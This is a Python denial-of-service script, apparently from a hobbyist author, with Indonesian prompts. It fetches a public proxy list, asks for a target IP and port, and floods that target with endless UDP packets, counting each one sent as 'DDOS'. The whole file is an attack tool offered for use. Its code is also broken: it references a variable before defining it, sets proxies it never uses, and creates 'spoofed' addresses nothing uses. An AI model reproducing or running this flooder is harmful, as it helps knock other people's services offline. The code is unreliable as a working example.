import socket, random, time, requests, struct, socks, requests, os
from rich import print as pr
from rich.panel import Panel as pn
from rich.text import Text

os.system('clear')

logo = """
┳┓┏┓┏┓┏┓        author  : DemonLord27
┃┃ ┫┃┃┗┓        version : 0.1
┻┛┗┛┗┛┗┛     
"""
try:
    os.remove('.prox.txt')
except OSError:
    os.system('clear')
prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
with open('.prox.txt', 'w') as file:
    file.write(prox)
pr(pn(logo))
ok = 0
no = 0
gas = f"GET /index.html HTTP/1.1\r\nHost: {ipp}\r\n\r\n"

prox = open('.prox.txt').read().splitlines()
for proxy in prox:
    parts = proxy.strip().split(':')
    if len(parts) == 2:
        host, prot = parts
        sock = socks.socksocket()
        typee = socks.PROXY_TYPE_SOCKS5
        sock.set_proxy(typee, host, prot)
ipp = input(" [+] Masukkan IP        : ")
port = int(input(" [+] Masukkan Port      : "))
socky = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = (ipp, port)
message = gas
buffer_size = 99999
socky.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, struct.pack("=I", buffer_size))
print()
while True:
    for proxy in prox:
        parts = proxy.strip().split(':')
        if len(parts) == 2:
            host, prot = parts
            sock = socks.socksocket()
            typee = socks.PROXY_TYPE_SOCKS5
            sock.set_proxy(typee, host, prot)
            try:
                socky.sendto(message.encode(), server_address)
                ok += 1
                loading_text = Text(f"Berhasil Mengirim {ok}{' DDOS' }", style='bold green')
                pr(loading_text, end='\r')
                spoofed_ip = str(random.randint(1, 255)) + "." + str(random.randint(1, 255)) + "." + str(random.randint(1, 255)) + "." + str(random.randint(1, 255))
            except OSError:
                no += 1
                loading_text = Text(f"Gagal Terkirim {no}{'    '}", style='bold red')
                pr(loading_text, end='\r')

